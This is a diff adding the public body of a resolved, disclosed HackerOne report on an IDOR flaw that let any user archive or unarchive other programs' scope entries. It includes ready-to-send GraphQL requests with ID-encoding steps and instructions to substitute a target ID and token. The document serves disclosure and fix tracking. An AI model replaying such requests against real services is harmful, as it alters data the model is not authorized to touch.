@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2022-04-18
 submitted: 2022-03-05T22:21:30.013Z
 bounty_usd: null
@@ -34,6 +35,63 @@ title: "An attacker can archive and unarchive any structured scope object on Hac
 We're taking steps to improve this. Specifically, HackerOne's security operations team has taken feedback from the engineering team about which questions to ask in the future that will help determine the legitimacy of a security vulnerability faster. Reports will also be assigned to the HackerOne engineering team faster. We are exploring how to roll out these triage changes to other customers. Lastly, HackerOne's engineering team also added a number of asset IDs to [our policy](https://hackerone.com/security/policy_versions?type=team&change=3669996) to help reproduce similar vulnerabilities. We aim to continuously expand this list of known identifiers for hackers to proof security vulnerabilities in production.
 
 That said, we'd be remiss if we didn't acknowledge that this vulnerability was hard to understand. When exploited, the video proof of concept showed a 404 page not found error and did not clearly demonstrate switching between different users or a program that the attacker didn't have access to.
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+**Summary:**
+Hello, I have discovered an IDOR vulnerability that allows the scope of any program to be archived. Scopes are used to give information about the valid scopes of a program. For example HackerOne has the following scopes:
+https://hackerone.com
+https://api.hackerone.com
+...
+
+### Steps To Reproduce
+
+1. Obtain the structured_scope_id: 
+This can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER
+For example, if the number was 94773 , the structered_scope_id would be Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==
+Or, it could be found by intercepting the response of the program profile page.
+
+2. Send the Following Request:
+``` 
+POST /graphql HTTP/2
+Host: hackerone.com
+Content-Length: 388
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
+Accept: */*
+X-Auth-Token: AUTHTOKEN
+Content-Type: application/json
+Origin: https://hackerone.com
+Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+
+{"operationName":"ArchiveScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation ArchiveScope($structured_scope_id: ID!) {\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
+```
+It is also possible to unarchive scopes of other programs with the following request.:
+```
+POST /graphql HTTP/2
+Host: hackerone.com
+Content-Length: 414
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
+Accept: */*
+X-Auth-Token: ████
+Content-Type: application/json
+Origin: https://hackerone.com
+Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+
+{"operationName":"UnarchiveStructuredScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
+```
+Even though the response will say no structured scope exists, the scope will be archived.
+Replace the structured_scope_id with the scope you wish to target and the X-Auth-Token with your token.
+I will provide an Mp4 PoC soon.
+
+## Impact
+
+An attacker could archive or unarchive all 90000+ scopes on HackerOne.
 
 ## Timeline
 
